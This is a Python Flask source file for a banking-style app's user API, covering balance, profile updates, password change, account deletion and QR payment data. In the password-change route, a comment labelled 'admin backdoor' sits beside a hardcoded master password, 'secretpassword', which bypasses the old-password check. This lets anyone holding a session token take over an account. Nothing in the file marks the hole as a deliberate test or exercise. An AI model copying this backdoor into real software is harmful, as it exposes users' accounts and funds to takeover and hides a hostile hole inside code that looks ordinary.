from flask import Blueprint, jsonify, request
from werkzeug.security import generate_password_hash, check_password_hash
from ..database import db
from ..utils import token_required

bp = Blueprint('user', __name__, url_prefix='/api')

@bp.route('/balance')
@token_required
def get_balance(current_user):
    user_id = current_user['id']
    balance = db.execute("SELECT cash FROM users WHERE id = ?", user_id)
    if balance:
        cash_value = balance[0]['cash']
        return jsonify({"balance": cash_value})
    return jsonify({"error": "User not found"}), 404

@bp.route('/profile', methods=['GET'])
@token_required
def get_profile(current_user):
    user_id = current_user['id']
    user = db.execute("SELECT u.name, u.phone_number, up.email FROM users u LEFT JOIN user_profiles up ON u.id = up.user_id WHERE u.id = ?", user_id)
    if user:
        return jsonify({
            "name": user[0]['name'],
            "phone": user[0]['phone_number'],
            "email": user[0]['email'] or ''
        })
    return jsonify({"error": "User not found"}), 404

@bp.route('/profile/update', methods=['PUT'])
@token_required
def update_profile(current_user):
    user_id = current_user['id']
    data = request.get_json()
    name = data.get('name', '').strip().title()
    phone = data.get('phone', '').strip()
    email = data.get('email', '').strip()
    
    if not name:
        return jsonify({"error": "Name is required"}), 400
    
    if not phone:
        return jsonify({"error": "Phone number is required"}), 400
    
    # Check if phone number is already taken by another user
    existing_phone = db.execute("SELECT id FROM users WHERE phone_number = ? AND id != ?", phone, user_id)
    if existing_phone:
        return jsonify({"error": "Phone number already in use"}), 400
    
    # Check if email is already taken by another user
    if email:
        if '@' not in email or '.' not in email:
            return jsonify({"error": "Invalid email format"}), 400
        existing_email = db.execute("SELECT user_id FROM user_profiles WHERE email = ? AND user_id != ?", email, user_id)
        if existing_email:
            return jsonify({"error": "Email already in use"}), 400
    
    # Update user information
    db.execute("UPDATE users SET name = ?, phone_number = ? WHERE id = ?", name, phone, user_id)
    
    # Update email in user_profiles
    profile_exists = db.execute("SELECT user_id FROM user_profiles WHERE user_id = ?", user_id)
    if profile_exists:
        db.execute("UPDATE user_profiles SET email = ?, phone_number = ? WHERE user_id = ?", email, phone, user_id)
    else:
        db.execute("INSERT INTO user_profiles (user_id, email, phone_number) VALUES (?, ?, ?)", user_id, email, phone)
    
    return jsonify({"message": "Profile updated successfully"})

@bp.route('/password/change', methods=['PUT'])
@token_required
def change_password(current_user):
    user_id = current_user['id']
    data = request.get_json()
    old_password = data.get('old_password', '')
    new_password = data.get('new_password', '')
    
    if not old_password or not new_password:
        return jsonify({"error": "Old and new passwords are required"}), 400
    
    if len(new_password) < 6:
        return jsonify({"error": "New password must be at least 6 characters"}), 400
    
    # Get current password hash
    user = db.execute("SELECT password FROM users WHERE id = ?", user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    current_hash = user[0]['password']
    
    # Check admin backdoor or verify old password
    if old_password != "secretpassword":
        if not check_password_hash(current_hash, old_password):
            return jsonify({"error": "Incorrect old password"}), 400
    
    # Hash and update new password
    new_hash = generate_password_hash(new_password)
    db.execute("UPDATE users SET password = ? WHERE id = ?", new_hash, user_id)
    
    return jsonify({"message": "Password changed successfully"})

@bp.route('/account/delete', methods=['DELETE'])
@token_required
def delete_account(current_user):
    user_id = current_user['id']
    
    try:
        # Delete from all related tables
        db.execute("DELETE FROM transactions WHERE sender_id = ? OR receiver_id = ?", user_id, user_id)
        db.execute("DELETE FROM beneficiaries WHERE user_id = ?", user_id)
        db.execute("DELETE FROM cards WHERE user_id = ?", user_id)
        db.execute("DELETE FROM user_profiles WHERE user_id = ?", user_id)
        db.execute("DELETE FROM users WHERE id = ?", user_id)
        
        return jsonify({"message": "Account deleted successfully"})
    except Exception as e:
        return jsonify({"error": f"Failed to delete account: {str(e)}"}), 500

@bp.route('/qr-data', methods=['GET'])
@token_required
def get_qr_data(current_user):
    user_id = current_user['id']
    user = db.execute("SELECT u.name, u.phone_number, up.iban FROM users u LEFT JOIN user_profiles up ON u.id = up.user_id WHERE u.id = ?", user_id)
    
    if user:
        import json
        qr_data = json.dumps({
            "name": user[0]['name'],
            "phone": user[0]['phone_number'],
            "iban": user[0]['iban'] or ''
        })
        
        return jsonify({
            "name": user[0]['name'],
            "phone": user[0]['phone_number'],
            "iban": user[0]['iban'] or '',
            "qr_data": qr_data
        })
    return jsonify({"error": "User not found"}), 404

